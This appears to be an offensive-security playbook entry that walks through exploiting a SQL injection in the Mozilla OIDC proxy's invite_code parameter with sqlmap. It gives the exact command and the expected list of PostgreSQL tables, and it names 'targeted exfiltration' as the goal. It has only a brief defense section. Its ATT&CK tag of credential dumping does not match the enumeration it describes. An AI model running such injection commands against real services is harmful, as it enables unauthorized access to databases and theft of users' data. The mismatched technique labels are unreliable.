---
id: proc-uuid-3
tags:
  - sqli
  - enumeration
  - sqlmap
  - postgresql
type: procedure
tools:
  - '[[tools/sqlmap]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/sqlmap-enumerate-postgresql-tables]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Credential Dumping]]'
updated_at: '2025-12-14T03:15:05.194Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Credential Dumping]]'
---
# Automated-Database-Enumeration-with-sqlmap

## Summary

This procedure automates SQL Injection exploitation using sqlmap to enumerate database schemas, tables, and columns, streamlining discovery of sensitive structures in vulnerable web applications.

## Description

Applied to the Mozilla OIDC proxy's invite_code parameter, sqlmap loads a request file and targets PostgreSQL to list tables like waitlist and invitation_tokens. It handles blind techniques automatically, revealing the public schema with Knex.js migrations, enabling targeted data dumps in cloud-hosted web services.

## Requirements

1. sqlmap installed and request file saved (e.g., sqli-mozilla.req)
2. SSL-enabled connection to target
3. Administrative privileges not required; public access suffices

## Defense

Defensive measures and detection strategies:

- Deploy intrusion detection for sqlmap-like payloads and multiple failed injections
- Use database activity monitoring to alert on schema queries from web apps
- Enforce least-privilege DB accounts for web backends

## Objectives

1. Enumerate all database tables and infer structure
2. Identify sensitive data stores like user waitlists
3. Prepare for targeted exfiltration

## Instructions

### Step 1: Load and Target Parameter

**Context**: Configure sqlmap with the vulnerable request file and specify the injection point.

Execute [[commands/sqlmap-enumerate-postgresql-tables]]:

```bash
sqlmap -r sqli-mozilla.req --level=3 -p invite_code --dbms=postgresql --tables --force-ssl
```

> Explanation: --level=3 increases test thoroughness; --tables lists schema contents.

### Step 2: Review Enumeration Output

**Context**: Analyze results for key tables.

No command; parse sqlmap output.

> Expected: Tables: allowlist, disallowed_handles, invitation_tokens, knex_migrations, knex_migrations_lock, oidc_payloads, regexp_disallowed_handles, sub_to_account, waitlist; DB: public.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Credential Dumping]] OS Credential Dumping

### Sub-Techniques

-

## Commands Used

- [[commands/sqlmap-enumerate-postgresql-tables]]

## Tools Used

- [[tools/sqlmap]]

## Tags

- [[sqli]]
- [[enumeration]]
